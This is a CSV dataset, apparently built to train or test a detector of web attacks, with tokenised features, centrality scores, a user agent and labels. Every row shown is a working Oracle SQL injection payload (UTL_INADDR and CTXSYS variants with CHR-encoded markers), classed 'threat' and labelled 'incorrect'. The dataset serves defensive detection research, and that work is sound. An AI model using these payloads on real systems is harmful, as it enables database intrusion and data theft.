payload,token,centrality,reqmethod,length,uagent,class,label
-3007'))) OR 9815=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9815=9815) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)) AND ((('xqlc'='xqlc,MINUS INT SQUT RPRN RPRN RPRN OR INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AND LPRN LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.0625 0.078125 0.09375 0.109375 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.125 0.109375 0.09375 0.078125 0.0625,GET,226,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
-4855' OR 9815=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9815=9815) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)) AND 'NJew'='NJew,MINUS INT SQUT OR INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AND SQUT STR SQUT EQ SQUT STR,0.06896551724137931 0.08620689655172414 0.10344827586206896 0.12068965517241378 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.12068965517241378 0.10344827586206896 0.08620689655172414 0.06896551724137931,GET,220,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
-4087') OR 9815=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9815=9815) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)) AND ('OPxz' LIKE 'OPxz,MINUS INT SQUT RPRN OR INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AND LPRN SQUT STR SQUT LIKE SQUT STR,0.06666666666666667 0.08333333333333333 0.1 0.11666666666666667 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.11666666666666667 0.1 0.08333333333333333 0.06666666666666667,GET,227,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
-5126')) OR 9815=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9815=9815) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)) AND (('NfHQ' LIKE 'NfHQ,MINUS INT SQUT RPRN RPRN OR INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AND LPRN LPRN SQUT STR SQUT LIKE SQUT STR,0.06451612903225806 0.08064516129032258 0.0967741935483871 0.11290322580645161 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.11290322580645161 0.0967741935483871 0.08064516129032258 0.06451612903225806,GET,229,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
-3518' OR 9815=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9815=9815) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)) AND 'ZEph' LIKE 'ZEph,MINUS INT SQUT OR INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AND SQUT STR SQUT LIKE SQUT STR,0.06896551724137931 0.08620689655172414 0.10344827586206896 0.12068965517241378 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.12068965517241378 0.10344827586206896 0.08620689655172414 0.06896551724137931,GET,225,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
"-2450"")) OR 9815=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9815=9815) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)) AND ((""Dksz""=""Dksz",MINUS INT DQUT RPRN RPRN OR INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AND LPRN LPRN DQUT STR DQUT EQ DQUT STR,0.06451612903225806 0.08064516129032258 0.0967741935483871 0.11290322580645161 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.11290322580645161 0.0967741935483871 0.08064516129032258 0.06451612903225806,GET,224,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
"-9379"") OR 9815=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9815=9815) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)) AND (""KuIV"" LIKE ""KuIV",MINUS INT DQUT RPRN OR INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AND LPRN DQUT STR DQUT LIKE DQUT STR,0.06666666666666667 0.08333333333333333 0.1 0.11666666666666667 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.11666666666666667 0.1 0.08333333333333333 0.06666666666666667,GET,227,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
"-4855"" OR 9815=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9815=9815) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)) AND ""CzIw"" LIKE ""CzIw",MINUS INT DQUT OR INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AND DQUT STR DQUT LIKE DQUT STR,0.06896551724137931 0.08620689655172414 0.10344827586206896 0.12068965517241378 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.12068965517241378 0.10344827586206896 0.08620689655172414 0.06896551724137931,GET,225,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
-4914%') OR 9815=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9815=9815) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)) AND ('%'=',MINUS INT PRCNT SQUT RPRN OR INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AND LPRN SQUT PRCNT SQUT EQ SQUT,0.06666666666666667 0.08333333333333333 0.1 0.11666666666666667 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.13333333333333333 0.11666666666666667 0.1 0.08333333333333333 0.06666666666666667,GET,216,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
-9127%')) OR 9815=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9815=9815) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)) AND (('%'=',MINUS INT PRCNT SQUT RPRN RPRN OR INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AND LPRN LPRN SQUT PRCNT SQUT EQ SQUT,0.06451612903225806 0.08064516129032258 0.0967741935483871 0.11290322580645161 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.11290322580645161 0.0967741935483871 0.08064516129032258 0.06451612903225806,GET,218,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
-5191%' OR 9815=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9815=9815) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)) AND '%'=',MINUS INT PRCNT SQUT OR INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT AND SQUT PRCNT SQUT EQ SQUT,0.06896551724137931 0.08620689655172414 0.10344827586206896 0.12068965517241378 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.13793103448275862 0.12068965517241378 0.10344827586206896 0.08620689655172414 0.06896551724137931,GET,214,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
-1402 OR 9815=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9815=9815) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))-- aicq,MINUS INT OR INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT DSCMT STR,0.07692307692307693 0.09615384615384616 0.11538461538461539 0.13461538461538464 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.13461538461538464 0.11538461538461539 0.09615384615384616 0.07692307692307693,GET,209,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
-3198 OR 9815=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9815=9815) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113))# QzSN,MINUS INT OR INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT HASH STR,0.07692307692307693 0.09615384615384616 0.11538461538461539 0.13461538461538464 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.15384615384615385 0.13461538461538464 0.11538461538461539 0.09615384615384616 0.07692307692307693,GET,208,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
"rob.star@gmail.com) AND 8696=CTXSYS.DRITHSX.SN(8696,(CHR(113)||CHR(106)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (8696=8696) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(120)||CHR(113)||CHR(98)||CHR(113)))-- aOOA",STR DOT STAR ATR STR DOT STR RPRN AND INT EQ STR DOT STR DOT STR INT CMMA CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR SELECT CASE WHEN INT EQ INT THEN INT ELSE INT END FROM DUAL OR CHR INT OR CHR INT OR CHR INT OR CHR INT OR CHR INT DSCMT STR,0.06451612903225806 0.08064516129032258 0.0967741935483871 0.11290322580645161 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.12903225806451613 0.11290322580645161 0.0967741935483871 0.08064516129032258 0.06451612903225806,GET,221,"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",threat,incorrect
